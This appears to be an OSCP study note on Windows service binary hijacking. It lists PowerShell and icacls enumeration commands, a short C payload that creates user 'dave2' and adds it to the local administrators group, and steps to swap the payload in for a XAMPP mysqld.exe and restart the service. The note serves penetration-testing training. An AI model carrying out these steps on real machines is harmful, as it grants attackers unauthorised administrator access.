# Service Binary Hijacking

## Identifying the service:

use the following command to get services running:
`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

Find service that stand out, like the ones below that are in `C:\xamp\..` rather than `C:\Windows\..` as it means the system is user insalled.
![image](https://github.com/M-1-7-7/OSCP_2023_notes/assets/108218328/1be9da19-a270-486e-99f6-de808705d678)

## Process enumeration:
permision masks from icacls output:
![image](https://github.com/M-1-7-7/OSCP_2023_notes/assets/108218328/eb360fa7-dec2-49cf-9bf4-43cf7654e8b1)

use icacls to enumerate permisions and everything about the binary:
`icacls <path to binary>`

![image](https://github.com/M-1-7-7/OSCP_2023_notes/assets/108218328/df9f7775-3f4b-4a70-b1e6-5d552163fe41)

because the above photo, users only have read and execute priv, we can not modify the exploit



## steps to produce the attack:
![image](https://github.com/M-1-7-7/OSCP_2023_notes/assets/108218328/e1534de0-5c3c-4797-86b2-392fdedc46cc)
1. mysql.exe has full writes for users so we will use that so create a payload that will create a new user and add them to the admin group:
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
2. compile the code for windows like this `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` or do it on the target machine

3. move the current `mysql.exe` out of the directory using:
   - `move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`
  
4. move the malicious binary into replace the official one:
   - `move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`
  
5. restart the service:
   - `net stop mysql` if you are allowed
   - else if start mode is set to `Auto` with this command `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}` then restart computer `restart-computer`
   - 



